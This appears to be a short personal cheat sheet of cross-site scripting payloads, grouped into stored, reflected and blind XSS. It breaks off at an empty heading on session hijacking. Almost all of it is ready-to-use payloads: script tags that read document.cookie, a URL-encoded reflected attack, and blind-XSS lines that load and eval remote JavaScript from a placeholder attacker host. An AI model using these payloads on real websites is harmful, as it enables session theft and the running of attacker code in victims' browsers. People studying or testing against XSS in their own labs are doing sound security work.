# XSS

### 1) Stored

Text to save to the application. If it is vulnerable once saved, when we access the website again we should see the code being executed.

    <script>alert("XSS")</script>
    
    <script>alert(document.cookie)</script>
    
    <script>alert(window.origin)</script>

### 2) Reflected

Include this payload in a URL. Most common place are the search pages for example.

    http://[SERVER_IP]:[PORT]/index.php?task=%3Cscript%3Ealert(document.cookie)%3C/script%3E

### 3) Blind

A good way to test this is to see if we can retrieve files externally using the JavaScript code.

    <script src=http://[OUR_IP]></script>
    
    '><script src=http://[OUR_IP]></script>
    
    <script>$.getScript("http://[OUR_IP]")</script>
    
    "><script src=http://[OUR_IP]></script>
    javascript:eval('var a=document.createElement(\'script\');a.src=\'http://OUR_IP\';document.body.appendChild(a)')
    <script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//OUR_IP");a.send();</script>

### 4) Privilege Escalation using Session Hijacking

